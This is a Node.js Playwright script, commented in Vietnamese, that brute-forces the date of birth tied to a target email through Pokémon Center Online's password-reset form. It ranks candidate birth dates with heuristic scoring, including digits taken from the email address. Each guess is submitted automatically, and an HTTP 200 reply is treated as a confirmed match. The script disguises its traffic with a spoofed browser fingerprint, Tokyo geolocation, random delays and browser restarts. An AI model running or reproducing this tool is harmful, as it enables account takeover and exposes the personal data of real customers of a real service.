const { chromium } = require('playwright');
const sleep = require('../utils/sleep');

// URL mới của form password reset
const PASSWORD_RESET_URL = 'https://www.pokemoncenter-online.com/reset-password/';

// Logic thông minh phức tạp: Hệ thống scoring cho DOB
function getSmartDOBList(email, dobList) {
  const smartList = [...dobList];
  
  // Tính điểm cho mỗi DOB dựa trên nhiều yếu tố
  smartList.forEach(dob => {
    let score = 0;
    const year = parseInt(dob.year);
    const month = parseInt(dob.month);
    const day = parseInt(dob.day);
    
    // 0. Kiểm tra DOB có trong email không (Ưu tiên cao nhất)
    const emailLower = email.toLowerCase();
    const dobPatterns = [
      `${dob.year}${dob.month}${dob.day}`, // 19900201
      `${dob.year}-${dob.month}-${dob.day}`, // 1990-02-01
      `${dob.year}/${dob.month}/${dob.day}`, // 1990/02/01
      `${dob.year}.${dob.month}.${dob.day}`, // 1990.02.01
      `${dob.day}${dob.month}${dob.year}`, // 01021990
      `${dob.day}-${dob.month}-${dob.year}`, // 01-02-1990
      `${dob.day}/${dob.month}/${dob.year}`, // 01/02/1990
      `${dob.day}.${dob.month}.${dob.year}`, // 01.02.1990
      `${dob.month}${dob.day}${dob.year}`, // 02011990
      `${dob.month}-${dob.day}-${dob.year}`, // 02-01-1990
      `${dob.month}/${dob.day}/${dob.year}`, // 02/01/1990
      `${dob.month}.${dob.day}.${dob.year}`, // 02.01.1990
      `${dob.year}${dob.month}`, // 199002
      `${dob.month}${dob.year}`, // 021990
      `${dob.day}${dob.month}`, // 0102
      `${dob.month}${dob.day}`, // 0201
      `${dob.year}`, // 1990
      `${dob.month}`, // 02
      `${dob.day}` // 01
    ];
    
    // Kiểm tra từng pattern trong email
    let emailMatchScore = 0;
    for (const pattern of dobPatterns) {
      if (emailLower.includes(pattern)) {
        // Điểm cao hơn cho pattern dài hơn (chính xác hơn)
        emailMatchScore = Math.max(emailMatchScore, pattern.length * 10);
      }
    }
    
    if (emailMatchScore > 0) {
      score += emailMatchScore + 200; // Bonus 200 điểm cho match trong email
    }
    
    // 1. Độ tuổi phổ biến (Pokemon fan thường 15-35 tuổi)
    const currentYear = new Date().getFullYear();
    const age = currentYear - year;
    
    if (age >= 15 && age <= 25) {
      score += 100; // Độ tuổi teen/young adult - rất phổ biến
    } else if (age >= 26 && age <= 35) {
      score += 80; // Độ tuổi adult - phổ biến
    } else if (age >= 36 && age <= 45) {
      score += 60; // Độ tuổi trung niên - khá phổ biến
    } else if (age >= 12 && age <= 14) {
      score += 40; // Độ tuổi thiếu niên
    } else if (age >= 46 && age <= 55) {
      score += 30; // Độ tuổi trung cao
    } else {
      score += 10; // Các độ tuổi khác
    }
    
    // 2. Thời gian đăng ký tài khoản (Pokemon GO ra mắt 2016, Pokemon Center phổ biến từ 2018)
    if (year >= 1995 && year <= 2005) {
      score += 50; // Độ tuổi phù hợp với Pokemon GO
    } else if (year >= 1985 && year <= 1994) {
      score += 40; // Độ tuổi Pokemon fan cũ
    } else if (year >= 2006 && year <= 2010) {
      score += 35; // Độ tuổi Gen Z
    }
    
    // 3. Mùa sinh (ảnh hưởng đến tính cách và sở thích)
    if (month >= 3 && month <= 5) {
      score += 20; // Mùa xuân - thích Pokemon
    } else if (month >= 6 && month <= 8) {
      score += 25; // Mùa hè - cao điểm nhất
    } else if (month >= 9 && month <= 11) {
      score += 15; // Mùa thu
    } else {
      score += 10; // Mùa đông
    }
    
    // 4. Ngày đặc biệt (Pokemon-related)
    if (day === 27) {
      score += 30; // Pokemon Red/Blue release date (27/02/1996)
    } else if (day === 23) {
      score += 25; // Pokemon Center anniversary
    } else if (day === 15) {
      score += 20; // Pokemon GO release month
    } else if (day === 6) {
      score += 15; // Pokemon anniversary
    } else if (day === 1 || day === 31) {
      score += 10; // Ngày đầu/cuối tháng dễ nhớ
    }
    
    // 5. Tháng đặc biệt
    if (month === 2) {
      score += 25; // Tháng Pokemon Red/Blue release
    } else if (month === 7) {
      score += 20; // Tháng Pokemon GO release
    } else if (month === 11) {
      score += 15; // Tháng Pokemon anniversary
    } else if (month === 12) {
      score += 10; // Tháng sinh nhật nhiều người
    }
    
    // 6. Năm đặc biệt (Pokemon milestones)
    if (year === 1996) {
      score += 40; // Pokemon Red/Blue release
    } else if (year === 1999) {
      score += 35; // Pokemon Gold/Silver
    } else if (year === 2002) {
      score += 30; // Pokemon Ruby/Sapphire
    } else if (year === 2006) {
      score += 25; // Pokemon Diamond/Pearl
    } else if (year === 2010) {
      score += 20; // Pokemon Black/White
    } else if (year === 2016) {
      score += 35; // Pokemon GO release
    }
    
    // 7. Pattern matching (số đẹp, dễ nhớ)
    if (day === month) {
      score += 15; // Ngày = tháng (1/1, 2/2, etc.)
    } else if (day === year % 100) {
      score += 20; // Ngày = 2 số cuối năm
    } else if (day === Math.floor(year / 100)) {
      score += 15; // Ngày = 2 số đầu năm
    }
    
    // 8. Zodiac compatibility (Japanese culture)
    const zodiacSigns = {
      1: 'Capricorn', 2: 'Aquarius', 3: 'Pisces', 4: 'Aries',
      5: 'Taurus', 6: 'Gemini', 7: 'Cancer', 8: 'Leo',
      9: 'Virgo', 10: 'Libra', 11: 'Scorpio', 12: 'Sagittarius'
    };
    
    // 9. Lucky numbers (Japanese culture)
    const luckyNumbers = [7, 8, 3, 1, 9];
    if (luckyNumbers.includes(day)) {
      score += 10;
    }
    
    // 10. Sequential patterns
    if (day === month + 1 || day === month - 1) {
      score += 10; // Ngày liền kề tháng
    }
    
    // 11. Age-based patterns (người thường chọn năm sinh dễ nhớ)
    if (year % 10 === 0) {
      score += 15; // Năm tròn (1990, 2000, etc.)
    } else if (year % 5 === 0) {
      score += 10; // Năm chia hết 5
    }
    
    // 12. Gaming culture patterns
    if (day <= 31 && month <= 12) {
      // Ngày tháng hợp lệ và phổ biến
      if (day >= 1 && day <= 28) {
        score += 5; // Ngày an toàn (không có vấn đề với tháng 2)
      }
    }
    
    // 13. Mobile gaming patterns (Pokemon GO players)
    if (age >= 18 && age <= 30) {
      score += 20; // Độ tuổi mobile gaming
    }
    
    // 14. Japanese culture influence
    if (day === 7 || day === 8) {
      score += 15; // Số may mắn trong văn hóa Nhật
    }
    
    // 15. Seasonal gaming patterns
    if ((month === 12 || month === 1 || month === 2) && age >= 20) {
      score += 10; // Mùa đông - thời gian gaming nhiều
    }
    
    // Lưu điểm vào object
    dob.score = score;
    dob.emailMatch = emailMatchScore > 0; // Đánh dấu có match trong email
  });
  
  // Sắp xếp theo điểm từ cao xuống thấp
  smartList.sort((a, b) => b.score - a.score);
  
  // Log thống kê ngắn gọn
  console.log(`\n🧠 SMART ANALYSIS: ${email}`);
  console.log(`📊 Total: ${smartList.length} DOBs | Top 3: ${smartList.slice(0, 3).map(d => `${d.year}-${d.month}-${d.day}(${d.score})`).join(', ')}`);
  
  return smartList;
}

module.exports = async function bruteForceBrowser(email, log, isRunning, dobList) {
  let browser = null;
  let page = null;
  let foundDOBs = []; // Lưu danh sách DOB tìm thấy
  
  try {
    log(`\n🚀 STARTING: ${email}`);
    
    // Sử dụng danh sách DOB thông minh nâng cao với email
    const smartDOBList = getSmartDOBList(email, dobList);
    
    // Khoi tao browser voi cau hinh toi uu cho toc do
    browser = await chromium.launch({ 
      headless: false, // Hien thi browser de debug
      slowMo: 500, // Giảm delay để tăng tốc
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--disable-dev-shm-usage',
        '--disable-accelerated-2d-canvas',
        '--no-first-run',
        '--no-zygote',
        '--disable-gpu',
        '--disable-web-security',
        '--disable-features=VizDisplayCompositor',
        '--disable-background-timer-throttling',
        '--disable-backgrounding-occluded-windows',
        '--disable-renderer-backgrounding',
        '--disable-field-trial-config',
        '--disable-ipc-flooding-protection',
        '--disable-extensions',
        '--disable-plugins',
        '--disable-images',
        '--disable-javascript',
        '--disable-default-apps'
      ]
    });
    
    const context = await browser.newContext({
      userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
      viewport: { width: 1920, height: 1080 },
      locale: 'ja-JP',
      timezoneId: 'Asia/Tokyo',
      permissions: ['geolocation'],
      geolocation: { longitude: 139.6917, latitude: 35.6895 }, // Tokyo coordinates
      extraHTTPHeaders: {
        'Accept-Language': 'ja,en-US;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1'
      }
    });
    
    page = await context.newPage();
    
    // Set timeout ngắn hơn để tăng tốc
    page.setDefaultTimeout(15000);
    page.setDefaultNavigationTimeout(15000);
    
    let tryCount = 0;
    let consecutiveErrors = 0;
    const maxConsecutiveErrors = 3; // Giảm số lần retry
    let sessionErrors = 0;
    const maxSessionErrors = 2; // Giảm số lần restart
    
    // Pre-load trang một lần để tăng tốc
    log(`⚡ Loading page...`);
    try {
      await page.goto(PASSWORD_RESET_URL, { waitUntil: 'domcontentloaded', timeout: 10000 });
      await page.waitForSelector('input[name="dwfrm_profile_passwordreset_email"]', { timeout: 10000 });
    } catch (err) {
      log(`⚠️ Pre-load failed, will retry each time`);
    }
    
    log(`\n📋 PROGRESS: ${smartDOBList.length} combinations to try\n`);
    
    for (const dob of smartDOBList) {
      if (!isRunning()) {
        log(`⏹️ STOPPED by user`);
        break;
      }
      
      tryCount++;
      const emailMatchIcon = dob.emailMatch ? '🎯' : '';
      const progress = `${tryCount}/${smartDOBList.length}`;
      const percentage = Math.round((tryCount / smartDOBList.length) * 100);
      
      log(`[${progress.padStart(8)}] (${percentage.toString().padStart(3)}%) ${dob.year}-${dob.month}-${dob.day} (${dob.score}) ${emailMatchIcon}`);
      
      try {
        // Di den trang password reset voi retry nhanh hon
        let retryCount = 0;
        const maxRetries = 2; // Giảm số lần retry
        
        while (retryCount < maxRetries) {
          try {
            await page.goto(PASSWORD_RESET_URL, { 
              waitUntil: 'domcontentloaded', // Thay đổi từ networkidle sang domcontentloaded để nhanh hơn
              timeout: 10000 
            });
            break;
          } catch (err) {
            retryCount++;
            if (retryCount >= maxRetries) throw err;
            await sleep.random(2000, 5000); // Giảm delay
          }
        }
        
        // Cho form load xong voi timeout ngan hon
        await page.waitForSelector('input[name="dwfrm_profile_passwordreset_email"]', { timeout: 8000 });
        
        // Clear form truoc khi dien (tranh loi)
        await page.fill('input[name="dwfrm_profile_passwordreset_email"]', '');
        await page.selectOption('select[name="dwfrm_profile_customer_birthdayyear"]', '');
        await page.selectOption('select[name="dwfrm_profile_customer_birthdaymonth"]', '');
        await page.selectOption('select[name="dwfrm_profile_customer_birthdayday"]', '');
        
        // Fill form voi delay nhanh hon
        await page.fill('input[name="dwfrm_profile_passwordreset_email"]', email);
        await sleep.random(100, 300); // Giảm delay
        
        await page.selectOption('select[name="dwfrm_profile_customer_birthdayyear"]', dob.year);
        await sleep.random(50, 150); // Giảm delay
        
        await page.selectOption('select[name="dwfrm_profile_customer_birthdaymonth"]', dob.month);
        await sleep.random(50, 150); // Giảm delay
        
        await page.selectOption('select[name="dwfrm_profile_customer_birthdayday"]', dob.day);
        await sleep.random(100, 300); // Giảm delay
        
        // Submit form
        const submitButton = await page.$('button[type="submit"]') || 
                           await page.$('input[type="submit"]') ||
                           await page.$('button:has-text("再発行用メールを送信する")') ||
                           await page.$('button:has-text("送信")') ||
                           await page.$('button:has-text("Submit")') ||
                           await page.$('input[value="再発行用メールを送信する"]');
        
        if (!submitButton) {
          throw new Error('Submit button not found');
        }
        
        // Lắng nghe response để kiểm tra status code
        let responseStatus = null;
        page.on('response', response => {
          if (response.url().includes('reset-password') || response.url().includes('passwordreset')) {
            responseStatus = response.status();
          }
        });
        
        await submitButton.click();
        
        // Cho response voi timeout ngan hon
        try {
          await page.waitForLoadState('domcontentloaded', { timeout: 8000 }); // Thay đổi từ networkidle
        } catch (err) {
          // Timeout không quan trọng
        }
        
        // Kiem tra ket qua dựa trên status code
        const isSuccess = responseStatus === 200;
        
        if (isSuccess) {
          // Tim thay DOB chinh xac - log va luu vao danh sach
          foundDOBs.push({
            email: email,
            dob: `${dob.year}-${dob.month}-${dob.day}`,
            score: dob.score,
            statusCode: responseStatus,
            emailMatch: dob.emailMatch,
            timestamp: new Date().toISOString()
          });
          
          const emailMatchIcon = dob.emailMatch ? '🎯' : '';
          log(`\n🎉 SUCCESS: ${dob.year}-${dob.month}-${dob.day} (Score: ${dob.score}, Status: ${responseStatus}) ${emailMatchIcon}`);
          log(`📧 Email: ${email}`);
          log(`📅 DOB: ${dob.year}-${dob.month}-${dob.day}`);
          log(`📊 Found: ${foundDOBs.length} total\n`);
        } else {
          // Log ngắn gọn cho thất bại
          const statusText = responseStatus ? `(${responseStatus})` : '(no response)';
          log(`  ❌ ${statusText}`);
        }
        
        consecutiveErrors = 0; // Reset error count on success
        sessionErrors = 0; // Reset session errors
        
        // Delay ngau nhien ngan hon
        const ms = Math.floor(Math.random() * (20000 - 8000 + 1)) + 8000;
        log(`  ⏳ Waiting ${Math.round(ms/1000)}s...\n`);
        await sleep.random(ms, ms);
        
      } catch (err) {
        consecutiveErrors++;
        sessionErrors++;
        log(`  ❌ ERROR: ${err.message}`);
        
        if (consecutiveErrors >= maxConsecutiveErrors) {
          log(`⚠️ Too many errors, pausing 1-2 minutes...`);
          await sleep.random(60000, 120000); // Giảm thời gian chờ
          consecutiveErrors = 0;
        }
        
        if (sessionErrors >= maxSessionErrors) {
          log(`🔄 Restarting browser...`);
          if (page) await page.close();
          if (browser) await browser.close();
          
          // Restart browser
          browser = await chromium.launch({ 
            headless: false,
            slowMo: 500, // Giảm delay
            args: [
              '--no-sandbox',
              '--disable-setuid-sandbox',
              '--disable-dev-shm-usage',
              '--disable-accelerated-2d-canvas',
              '--no-first-run',
              '--no-zygote',
              '--disable-gpu'
            ]
          });
          
          const context = await browser.newContext({
            userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            viewport: { width: 1920, height: 1080 },
            locale: 'ja-JP',
            timezoneId: 'Asia/Tokyo'
          });
          
          page = await context.newPage();
          sessionErrors = 0;
        }
        
        await sleep.random(10000, 20000); // Giảm delay
      }
    }
    
    // Log tong ket cuoi cung
    if (foundDOBs.length > 0) {
      log(`\n🎯 FINAL RESULTS: ${foundDOBs.length} DOBs found for ${email}`);
      foundDOBs.sort((a, b) => b.score - a.score); // Sắp xếp theo điểm
      foundDOBs.forEach((result, index) => {
        const emailMatchIcon = result.emailMatch ? '🎯' : '';
        log(`📋 ${index + 1}. ${result.dob} (Score: ${result.score}, Status: ${result.statusCode}) ${emailMatchIcon}`);
      });
    } else {
      log(`\n❌ No DOBs found for ${email}`);
    }
    
    log(`\n✅ COMPLETED: ${email}`);
    
  } catch (err) {
    log(`💥 CRITICAL ERROR: ${err.message}`);
  } finally {
    try {
      if (page) await page.close();
      if (browser) await browser.close();
    } catch (err) {
      log(`⚠️ Browser close error: ${err.message}`);
    }
  }
}; 